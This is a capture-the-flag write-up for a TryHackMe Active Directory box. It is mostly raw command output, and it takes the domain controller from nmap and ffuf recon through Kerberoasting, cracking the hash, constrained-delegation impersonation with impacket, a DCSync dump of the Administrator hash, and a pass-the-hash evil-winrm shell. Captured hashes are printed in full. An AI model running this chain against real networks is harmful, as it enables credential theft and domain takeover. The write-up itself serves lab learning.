---
tags:
title: Crocc Crew - Insane (THM)
permalink: /Crocc-Crew-THM-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash 
zs1n@ptw ~> nmapf 10.67.159.69
Nmap Full scan in progress
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-25 18:54 -0400
Initiating Ping Scan at 18:54
Scanning 10.67.159.69 [4 ports]
Completed Ping Scan at 18:54, 0.33s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 18:54
Completed Parallel DNS resolution of 1 host. at 18:54, 0.51s elapsed
Initiating SYN Stealth Scan at 18:54
Scanning 10.67.159.69 [65535 ports]
Discovered open port 139/tcp on 10.67.159.69
Discovered open port 53/tcp on 10.67.159.69
Discovered open port 135/tcp on 10.67.159.69
Discovered open port 80/tcp on 10.67.159.69
Discovered open port 445/tcp on 10.67.159.69
Discovered open port 3389/tcp on 10.67.159.69
Discovered open port 49674/tcp on 10.67.159.69
Discovered open port 49667/tcp on 10.67.159.69
Discovered open port 389/tcp on 10.67.159.69
Discovered open port 49669/tcp on 10.67.159.69
Discovered open port 49672/tcp on 10.67.159.69
Discovered open port 636/tcp on 10.67.159.69
Discovered open port 49671/tcp on 10.67.159.69
Discovered open port 88/tcp on 10.67.159.69
Discovered open port 49668/tcp on 10.67.159.69
Discovered open port 464/tcp on 10.67.159.69
Discovered open port 593/tcp on 10.67.159.69
Completed SYN Stealth Scan at 18:54, 13.77s elapsed (65535 total ports)
Nmap scan report for 10.67.159.69
Host is up, received echo-reply ttl 126 (0.28s latency).
Scanned at 2026-03-25 18:54:06 EDT for 14s
Not shown: 65518 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE        REASON
53/tcp    open  domain         syn-ack ttl 126
80/tcp    open  http           syn-ack ttl 126
88/tcp    open  kerberos-sec   syn-ack ttl 126
135/tcp   open  msrpc          syn-ack ttl 126
139/tcp   open  netbios-ssn    syn-ack ttl 126
389/tcp   open  ldap           syn-ack ttl 126
445/tcp   open  microsoft-ds   syn-ack ttl 126
464/tcp   open  kpasswd5       syn-ack ttl 126
593/tcp   open  http-rpc-epmap syn-ack ttl 126
636/tcp   open  ldapssl        syn-ack ttl 126
3389/tcp  open  ms-wbt-server  syn-ack ttl 126
49667/tcp open  unknown        syn-ack ttl 126
49668/tcp open  unknown        syn-ack ttl 126
49669/tcp open  unknown        syn-ack ttl 126
49671/tcp open  unknown        syn-ack ttl 126
49672/tcp open  unknown        syn-ack ttl 126
49674/tcp open  unknown        syn-ack ttl 126

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 14.76 seconds
           Raw packets sent: 131062 (5.767MB) | Rcvd: 558 (135.192KB)
-e [*] IP: 10.67.159.69
[*] Puertos abiertos: 53,80,88,135,139,389,445,464,593,636,3389,49667,49668,49669,49671,49672,49674
/usr/bin/xclip
-e [*] Service scanning with nmap against 53,80,88,135,139,389,445,464,593,636,3389,49667,49668,49669,49671,49672,49674 Ports..
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-25 18:54 -0400
Nmap scan report for 10.67.159.69
Host is up (0.22s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-25 22:54:23Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: COOCTUS.CORP, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: COOCTUS
|   NetBIOS_Domain_Name: COOCTUS
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: COOCTUS.CORP
|   DNS_Computer_Name: DC.COOCTUS.CORP
|   Product_Version: 10.0.17763
|_  System_Time: 2026-03-25T22:55:16+00:00
|_ssl-date: 2026-03-25T22:55:55+00:00; -5s from scanner time.
| ssl-cert: Subject: commonName=DC.COOCTUS.CORP
| Not valid before: 2026-03-24T22:53:51
|_Not valid after:  2026-09-23T22:53:51
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49669/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
|_clock-skew: mean: -5s, deviation: 0s, median: -5s
| smb2-time:
|   date: 2026-03-25T22:55:17
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 104.68 seconds
```

![[Pasted image 20260325195427.png]]


```BASH
zs1n@ptw ~> ffuf -u 'http://10.67.159.69/FUZZ.php' -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 200

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.67.159.69/FUZZ.php
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

# Priority ordered case-sensitive list, where entries were found [Status: 200, Size: 5342323, Words: 0, Lines: 0, Duration: 0ms]
# on at least 2 different hosts [Status: 200, Size: 5342323, Words: 148, Lines: 6, Duration: 517ms]
#                       [Status: 200, Size: 5342323, Words: 148, Lines: 6, Duration: 520ms]
# Copyright 2007 James Fisher [Status: 200, Size: 5342323, Words: 148, Lines: 6, Duration: 516ms]
# Attribution-Share Alike 3.0 License. To view a copy of this [Status: 200, Size: 5342323, Words: 148, Lines: 6, Duration: 517ms]
#                       [Status: 200, Size: 5342323, Words: 148, Lines: 6, Duration: 514ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/ [Status: 200, Size: 5342323, Words: 148, Lines: 6, Duration: 518ms]
#                       [Status: 200, Size: 5342323, Words: 148, Lines: 6, Duration: 517ms]
backdoor                [Status: 200, Size: 529, Words: 57, Lines: 21, Duration: 206ms]
# directory-list-2.3-medium.txt [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 517ms]
# This work is licensed under the Creative Commons [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 518ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 515ms]
#                       [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 514ms]
# or send a letter to Creative Commons, 171 Second Street, [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 517ms]
```

![[Pasted image 20260325195755.png]]

![[Pasted image 20260325200239.png]]

```bash
xfreerdp3 /v:10.67.159.69 /u:"" /p:"" /sec:nla:off /sec:rdp /cert:ignore
```

![[Pasted image 20260325203853.png]]

```bash
zs1n@ptw ~> impacket-smbclient COOCTUS.CORP/visitor:'GuestLogin!'@DC.COOCTUS.CORP -dc-ip 10.67.159.69
Impacket v0.14.0.dev0+20260219.104542.8728bbcf - Copyright Fortra, LLC and its affiliated companies

Type help for list of commands
# shares
ADMIN$
C$
Home
IPC$
NETLOGON
SYSVOL
# use home
# ls
drw-rw-rw-          0  Tue Jun  8 15:42:53 2021 .
drw-rw-rw-          0  Tue Jun  8 15:42:53 2021 ..
-rw-rw-rw-         17  Tue Jun  8 15:41:45 2021 user.txt
# get user.txt
```

```bash
zs1n@ptw ~> impacket-GetUserSPNs COOCTUS.CORP/visitor:'GuestLogin!'  -request
Impacket v0.14.0.dev0+20260219.104542.8728bbcf - Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName  Name            MemberOf  PasswordLastSet             LastLogon                   Delegation
--------------------  --------------  --------  --------------------------  --------------------------  -----------
HTTP/dc.cooctus.corp  password-reset            2021-06-08 18:00:39.356663  2021-06-08 17:46:23.369540  constrained



[-] CCache file is not found. Skipping...
$krb5tgs$23$*password-reset$COOCTUS.CORP$COOCTUS.CORP/password-reset*$05bb42933c21f88ea31d286632f433a0$187255c648b8e22b0772afb485fb3469888d01e5da00016738c42a4ee70d8a526abbd49f6a3040e2493606de19f5256a0ee9363a75924ad6704cec68bc5c09af61fc27f6e99a9fb97e09056b78849dbeffdd10f7a79372008da6b409cc6be95ca81d70e39cb43d7567d1065a6b70fd1c027fb44c2c5d7758552520df84048c9b3d010fb1588dac0104896ae731709edb13201ce4cf0a4cfb41de84b6552332ac00941030c6086a84e530f57cfd12f335794251250aec074176ddccaa7e918442e2844702d3be0bc4182b86664de46343832a82c29a8921854c8843a078d2b0601c893e69ec45c6609d52b5149f60c69fb285e427338685240425a9e87b9528726ab4c576fae1fd159cb87fd4a5e88b5fd979f81d5088b152acb1c0f309195cd4baccf516e5dfa220904bd0dd1703f05ae76de48b65779c786f15bc394f0ededf9556b8561d1fd1f4e9fcbc6c5b11eb1779a245f57048737e6aae7907b7d9e8f0b300d8e7943cb7228b0115e1d83e7d43afa4fad2780ff7d18262ff1d5e0fe98e0e1955b6e5073a5a9bb32db27dd2d02b4644e3cd249846825cbaebe6710f00fc11c9c26a0a988680a652d4c7f8d390827819d314c7ea7c217764d864a1cd178560f33eb415a20f013a136179e1909b68f093e750d0c77841ab4027c0777c55d03b85f43b1bbc76c15f1cc76f56e943057f3eaca6528e3683b8bf5cc1d7c2de1f75c9b08d8373fe843c79dee4f355a9f697254998a93ff286359ca9def8e19ffb06c16689c003658c117795352f6531530673c3a814b7f637cbf454dfc8b639d91b8f22bb64a0ee1931ac830940af845bbcddcb260b669c2450a94580e8204a880b117bd6633d0a44ee0f55456e6f96e6811817087b7eb65659a0c325318d0806ee62cce565dfe8739c8833fe4906f673464278de6517b8a59b108d32fb7226eed7096a2c2d9e14f46ece6bc049e43998200dfe4a659167f20289a8fd8d1a5ccea1b0062bf5ac938aa9f47fd4cd48e82d0dc38133771d7bd535897656e090b4bc1ae660c9ff449fbb4c189a99778e0e0a357fb723515509479fc828aee0f3c4ea14a39f2f5f97eb26116b6b84baa136cfd2f1093a30ff7a3720b8c377b24f64dad78d63849e8d3c8351fdaf08d37037682833ab790c199b0a1e7116fe689bd52b19339bd691ebdaacf022a5741ab3202285da058db27f9a335b20d79eac49f290c9a9ce8d9db62cc4a53c4b367a2db37b9f77e4d242e451ff67f39c73a65c16ddc16b2464818b6fc6d71509d9a58ada3fe4636e60489dc65e18f479be2599a2a2aeae96d3a9a97071e9347a5967e411da0ffffa925c6c3086c7656481
```

```bash
zs1n@ptw ~> j hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
resetpassword    (?)
1g 0:00:00:00 DONE (2026-03-25 19:54) 10.00g/s 2365Kp/s 2365Kc/s 2365KC/s rikelme..pink panther
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

```bash
zs1n@ptw ~> impacket-getST COOCTUS.CORP/password-reset:resetpassword -impersonate administrator -spn "cifs/dc.cooctus.corp" -self
Impacket v0.14.0.dev0+20260219.104542.8728bbcf - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
[*] When doing S4U2self only, argument -spn is ignored
[*] Requesting S4U2self
[*] Saving ticket in administrator@password-reset@COOCTUS.CORP.ccache

zs1n@ptw ~> impacket-describeTicket administrator@password-reset@COOCTUS.CORP.ccache
Impacket v0.14.0.dev0+20260219.104542.8728bbcf - Copyright Fortra, LLC and its affiliated companies

[*] Number of credentials in cache: 1
[*] Parsing credential[0]:
[*] Ticket Session Key            : fe0aac4e0fd67422bbfee6ba9007aaea
[*] User Name                     : administrator
[*] User Realm                    : COOCTUS.CORP
[*] Service Name                  : password-reset
[*] Service Realm                 : COOCTUS.CORP
[*] Start Time                    : 25/03/2026 19:57:13 PM
[*] End Time                      : 26/03/2026 05:57:12 AM
[*] RenewTill                     : 26/03/2026 19:57:17 PM
[*] Flags                         : (0x40a10000) forwardable, renewable, pre_authent, enc_pa_rep
[*] KeyType                       : rc4_hmac
[*] Base64(key)                   : /gqsTg/WdCK7/ua6kAeq6g==
[*] Kerberoast hash               : $krb5tgs$23$*USER$COOCTUS.CORP$password-reset*$d99284fe8e6a28036d12d81c75cbfe54$66b2b3c1f54caad7fac4f871edc4d88263ea4ee258de01c3b1c320466f65cd5d13dabc9798506b63c129031192f4b342c91dee092701d318d69ce37aab3b88eefbc4bb1a47dd2d671480daf91ffc272b311d7a625226ae75b28a0a99597c63b9807a03e7661fb46d05e07c143fad1b71ab821aa21516b7e35d6d3741da61077dd713baae1dadbdc15bf4da1d2cc7d55eb016a53f213050570c912a4e4947fe142248accfbf703f07664d05c81e8a06643b4a9c2df14f7de820f873e9b90791adcacf642e2a7304f7d6f9e1e168bea13eb3303ea9afef04155ba12ce61ea4aa29077dc2c84a40bdff88af0ef13cc188f83cbab3d413445ccce35708a48f2f2d8be7b8c9d741ed16eec260fa500fe6941c8de15e7ca2c83e6a2a7b0e3ee9167677f15107ae89720298d747aac35cd8a92ccf90791c6c1416dd5c949962e1a2d354902eff08bcc5577a549f5f3a39c455c835d8a86f29bc0085a4070abd9dac7c33b73dec57c21dcf4afc1451472c65fb2f2a24a96824b520152fe9516f70d4500de693be59a97e53c26f75505026607500b2654aaeac7a56946b48ca80cfee5b5a2b5633f359afeba6f5d2b922a57c0e5aae3ba4054591d2dbf6ba39c842740fa417a47960239adbdb7d1e086e11118714a1602bb178845301e2da4dbe1d68ecba088221269bcfa1001fcad92bcfbb658233752dd10679c9cb7e6a78740770da37f1a13d15b5e3f3ef702f7c90e74f275297d9bfc427fa046c068b0571bcf2e3481aa32561727399926c7feafbf624d1da12dad5979a0b6213f02a3bd618d3e5d75b79dc27e0e680f7e3f96c0a219f206471afea0b79d7eba6a8e02ad18aee99da42f4deaa00aea89248326eae25d769bd31a5c7ebd7339fdc3c98e8fd8672d48c467f13a0f28e75fafd814a80c78a859150367572cab166cc510b3e026026fccffaf953c3abd56b36fced8c5701fac2c4e9b2e00d0fd315118151cd84f6223279674c6c78580a25f6ee15a1119533821a4e87b4bc291b708f99690c6f32d5788257a625c0b61162a48a5acc07ffa882cbb560105545208d73f438f23a731e45e702edbc3e3ab9f4cdfbef2a30c9c56316a54a293ce751fbcefc12406c44b29fdd0a0270bae8a2a15f05cd81f67eed0c4ddbf72c5a45b11fedd16c71192a17c69b3001f95b693d3569f075a7bcb463963435a994579591a8022305efce1d2800bb1807c553e3162f66e5beb5ddae136b0b5c5ef8fa9df9defa436536a485265bf3920af85b0ef7a99b93c185e6638578219c81c9afb902903b5e1308856170c5a3393254c88df0ab6bc41816248794c9c3740f0e7ecf820915f1735b8182f83ac6a066bd77a53a71782bfc859a723a9baba8ee9cf71fa189e48f3585f2d69a25989ef18af8408d171355825bb94284b7c5e96a5ea2b60512b02f51b4047b315d50f6e38e76a559f2df8deb77bd70cbdd957cfef4f7d29da5d5fe3b1291cc58ffda5814
[*] Decoding unencrypted data in credential[0]['ticket']:
[*]   Service Name                : password-reset
[*]   Service Realm               : COOCTUS.CORP
[*]   Encryption type             : rc4_hmac (etype 23)
[-] Could not find the correct encryption key! Ticket is encrypted with rc4_hmac (etype 23), but no keys/creds were supplied
```

```bash
zs1n@ptw ~> findDelegation.py cooctus.corp/password-reset:resetpassword -dc-ip 10.67.159.69
Impacket v0.14.0.dev0+20260219.104542.8728bbcf - Copyright Fortra, LLC and its affiliated companies

AccountName     AccountType  DelegationType                      DelegationRightsTo                   SPN Exists
--------------  -----------  ----------------------------------  -----------------------------------  ----------
DC$             Computer     Unconstrained                       N/A                                  Yes
password-reset  Person       Constrained w/ Protocol Transition  oakley/DC.COOCTUS.CORP/COOCTUS.CORP  No
password-reset  Person       Constrained w/ Protocol Transition  oakley/DC.COOCTUS.CORP               No
password-reset  Person       Constrained w/ Protocol Transition  oakley/DC                            No
password-reset  Person       Constrained w/ Protocol Transition  oakley/DC.COOCTUS.CORP/COOCTUS       No
password-reset  Person       Constrained w/ Protocol Transition  oakley/DC/COOCTUS                    No
```

```bash
zs1n@ptw ~> impacket-getST COOCTUS.CORP/password-reset:resetpassword -impersonate administrator -spn "oakley/DC.COOCTUS.CORP"
Impacket v0.14.0.dev0+20260219.104542.8728bbcf - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@oakley_DC.COOCTUS.CORP@COOCTUS.CORP.ccache

zs1n@ptw ~> export KRB5CCNAME=administrator@

zs1n@ptw ~> export KRB5CCNAME=administrator@oakley_DC.COOCTUS.CORP@COOCTUS.CORP.ccache
```

```bash
zs1n@ptw ~> impacket-secretsdump -k -no-pass -dc-ip 10.67.159.69 -just-dc-user administrator DC.COOCTUS.CORP
Impacket v0.14.0.dev0+20260219.104542.8728bbcf - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:add41095f1fb0405b32f70a489de022d:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:129d7f8a246f585fadc6fe095403b31b606a940f726af22d675986fc582580c4
Administrator:aes128-cts-hmac-sha1-96:2947439c5d02b9a7433358ffce3c4c11
Administrator:des-cbc-md5:5243234aef9d0e83
[*] Cleaning up...
```

```powershell
zs1n@ptw ~> evil-winrm -i cooctus.corp -u administrator -H add41095f1fb0405b32f70a489de022d

Evil-WinRM shell v3.9

*Evil-WinRM* PS C:\Users\Administrator> cd c:\; dir


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         6/7/2021   7:30 PM                Background
d-----         6/7/2021   5:30 PM                inetpub
d-----         6/7/2021  10:53 PM                PerfLogs
d-r---         6/8/2021   3:44 PM                Program Files
d-----         6/7/2021   5:25 PM                Program Files (x86)
d-----         6/7/2021   8:05 PM                Shares
d-r---         6/8/2021  11:54 AM                Users
d-----         6/8/2021   3:50 PM                Windows

*Evil-WinRM* PS C:\> cd shares\home
ls
*Evil-WinRM* PS C:\shares\home> ls


    Directory: C:\shares\home


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         6/8/2021  12:38 PM             28 priv-esc-2.txt
-a----         6/7/2021   8:08 PM             22 priv-esc.txt
-a----         6/7/2021   8:14 PM             17 user.txt


*Evil-WinRM* PS C:\shares\home> cat priv-esc.txt
THM{0n-Y0ur-Way-t0-DA}
*Evil-WinRM* PS C:\shares\home> cat priv-esc-2.txt
THM{Wh4t-t0-d0...Wh4t-t0-d0}
```

```bash
*Evil-WinRM* PS C:\perflogs\admin> type root.txt
THM{Cr0ccCrewStr1kes!}
```